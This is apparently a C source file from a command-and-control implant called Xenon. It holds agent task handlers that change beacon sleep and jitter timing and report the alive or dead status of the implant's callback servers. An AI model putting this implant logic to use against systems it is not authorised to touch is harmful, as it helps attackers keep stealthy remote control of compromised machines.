/*
 * Contains misc agent tasks that do not necessitate their own file.
*/
#include "Tasks/Agent.h"

#include "Xenon.h"
#include "Parser.h"
#include "Strategy.h"

/** 
 * Update the sleep & jitter timers for global Xenon instance.
*/ 
VOID AgentSleep(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
{
    // Get command arguments for filepath
    UINT32 nbArg = ParserGetInt32(arguments);

    _dbg("\t Got %d arguments", nbArg);

    if (nbArg == 0)
    {
        return;
    }

    xenonConfig->sleeptime  = ParserGetInt32(arguments);
    xenonConfig->jitter     = ParserGetInt32(arguments);
    
    // Success
    PackageComplete(taskUuid, NULL);
}

/**
 * List Agents Current Connection host info
 */
VOID AgentStatus(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
{
    // Get command arguments for filepath
    UINT32 nbArg = ParserGetInt32(arguments);
    _dbg("\t Got %d arguments", nbArg);

    PPackage data = PackageInit(0, NULL);

    PCALLBACK_NODE current = xenonConfig->CallbackDomainHead;  // Start at head
    int count = 0;
    while (current) {  // Loop while the current node is not NULL
        count++;
        PackageAddFormatPrintf(data, FALSE, "%s:%d -> %s%s\n",
                            current->hostname, current->port,
                            current->isDead ? "DEAD" : "ALIVE",
                        current == xenonConfig->CallbackDomains ? "\t(current)" : "");

        current = current->next;  // Move to the next node
    }

    // Success
    PackageComplete(taskUuid, data);

    // Cleanup
    PackageDestroy(data);
}
